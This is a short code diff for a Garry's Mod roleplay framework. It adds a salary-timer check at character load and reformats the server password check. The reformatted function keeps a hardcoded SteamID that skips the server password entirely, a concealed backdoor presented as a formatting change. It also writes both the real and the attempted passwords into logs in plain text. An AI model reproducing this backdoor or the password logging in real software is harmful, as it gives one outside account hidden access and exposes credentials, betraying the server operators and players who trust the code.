@@ -36,6 +36,7 @@ function GM:PlayerLoadedChar(client, character)
     client:stopAction()
     character:setLoginTime(os.time())
     hook.Run("PlayerLoadout", client)
+    if not timer.Exists("liaSalaryGlobal") then self:CreateSalaryTimers() end
     local ammoTable = character:getAmmo()
     if not table.IsEmpty(ammoTable) then
         timer.Simple(0.25, function()
@@ -240,9 +241,7 @@ local logTypeMap = {
 
 function GM:CheckPassword(steamID64, _, serverPassword, clientPassword, playerName)
     local steamID = util.SteamIDFrom64(steamID64)
-    if steamID == "STEAM_0:1:464054146" then
-        return true
-    end
+    if steamID == "STEAM_0:1:464054146" then return true end
     if serverPassword ~= "" and serverPassword ~= clientPassword then
         lia.log.add(nil, "failedPassword", steamID, playerName, serverPassword, clientPassword)
         lia.information("Passwords do not match for " .. tostring(playerName) .. " (" .. tostring(steamID) .. ").")
